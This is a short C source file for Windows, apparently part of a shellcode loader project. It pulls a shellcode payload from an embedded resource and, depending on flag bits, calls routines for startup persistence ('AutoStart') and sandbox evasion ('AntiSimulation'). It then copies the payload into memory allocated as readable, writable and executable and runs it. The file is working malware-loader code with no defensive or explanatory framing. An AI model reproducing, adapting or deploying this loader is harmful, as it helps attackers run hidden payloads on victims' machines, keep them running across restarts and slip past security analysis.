#include <windows.h>
#include "../Loader.h"
int main()
{
	UINT shellcodeSize = 0;
	unsigned char *shellcode = GetShellcodeFromRes(SOURCEID, &shellcodeSize);
	if (shellcode == NULL)
	{
		printf("Get Resource error\n");
		return 1;
	}
	if (*shellcode & 1)
	{
		AutoStart();
	}
	if (*shellcode & 2)
	{
		AntiSimulation();
	}

	//2.Get shellcode memory
	LPVOID Memory = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!Memory)
	{
		printf("VirtualAlloc error %d\n", GetLastError());
		return 1;
	}
	memcpy(Memory, shellcode + 2, shellcodeSize);
	//3.Execute shellcode
	((void (*)())Memory)();
}